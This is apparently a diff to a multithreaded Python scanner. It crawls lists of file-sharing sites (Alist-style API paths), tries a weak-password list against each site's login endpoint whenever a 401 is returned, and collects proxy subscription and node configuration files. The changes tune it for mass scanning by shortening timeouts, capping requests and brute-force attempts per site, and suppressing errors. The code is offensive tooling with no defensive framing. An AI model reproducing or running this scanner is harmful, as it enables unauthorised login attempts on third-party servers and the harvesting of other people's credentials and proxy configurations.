@@ -16,8 +16,9 @@ INPUT_FILE = 'duplicate.txt'     # 输入网址清单
 OUTPUT_DIR = 'scan_results'      # 结果输出目录
 STATUS_FILE = 'site_status.csv'   # 站点存活状态表
 MAX_THREADS = 60                 # 线程数
-TIMEOUT = 5                      # 超时设置
-MAX_DEPTH = 4                    # 扫描深度
+TIMEOUT = 3                      # 优化：缩短超时，防止死链挂起线程
+MAX_DEPTH = 3                    # 优化：适度降低深度，防止陷入超大云盘死循环
+MAX_REQ_PER_SITE = 100           # 新增：单站点最大请求数，防止在某个站卡死
 
 # 资源白名单 (仅保留与订阅、节点、代理配置相关的后缀)
 INCLUDE_EXTS = {
@@ -196,9 +197,10 @@ def load_status_cache():
 def attempt_login(base_url, session):
     """仅在必要时(401)触发弱口令尝试"""
     login_url = f"{base_url.rstrip('/')}/api/auth/login"
-    for cred in WEAK_PASSWORDS:
+    # 优化：限制弱口令尝试范围为前 20 个，防止爆破导致单站卡死
+    for cred in WEAK_PASSWORDS[:20]:
         try:
-            resp = session.post(login_url, json=cred, timeout=3, verify=False)
+            resp = session.post(login_url, json=cred, timeout=2, verify=False)
             if resp.status_code == 200 and resp.json().get("code") == 200:
                 return resp.json().get("data", {}).get("token")
         except: continue
@@ -242,11 +244,13 @@ def scan_site(url, session):
     visited = {"/"}
     token = None
     is_alive = False
+    req_count = 0 # 插入：单站点请求计数器
 
-    while queue:
+    while queue and req_count < MAX_REQ_PER_SITE:
         path, depth = queue.popleft()
         if depth > MAX_DEPTH: continue
 
+        req_count += 1
         items, token = fetch_list(url, path, token, session)
         if items is None: continue 
         
@@ -265,7 +269,6 @@ def scan_site(url, session):
                 if ext in INCLUDE_EXTS:
                     if any(p in name.lower() for p in IGNORE_PATTERNS): continue
                     
-                    # 修正此处的字符串闭合语法错误
                     d_url = f"{url.rstrip('/')}/d{full_path}"
                     
                     # 检查内容是否符合节点/订阅特征
@@ -288,6 +291,8 @@ def main():
     print(f"📊 任务: 待扫描 {len(urls)} (已跳过死链 {len(raw_urls)-len(urls)})")
 
     session = requests.Session()
+    # 优化：显式更新 Session Header，关闭 Keep-Alive 减少连接占用
+    session.headers.update({"Connection": "close"})
     adapter = requests.adapters.HTTPAdapter(pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS*2)
     session.mount('http://', adapter)
     session.mount('https://', adapter)
@@ -298,9 +303,13 @@ def main():
     with concurrent.futures.ThreadPoolExecutor(MAX_THREADS) as executor:
         future_to_url = {executor.submit(scan_site, u, session): u for u in urls}
         for future in concurrent.futures.as_completed(future_to_url):
-            url, res, status = future.result()
-            status_report.append({'url': url, 'file_count': len(res), 'status': status})
-            all_results.extend(res)
+            try:
+                url, res, status = future.result()
+                status_report.append({'url': url, 'file_count': len(res), 'status': status})
+                all_results.extend(res)
+            except Exception as e:
+                # 异常捕获防止线程池崩溃
+                pass
 
     scanned_urls = {d['url'] for d in status_report}
     for u in raw_urls:
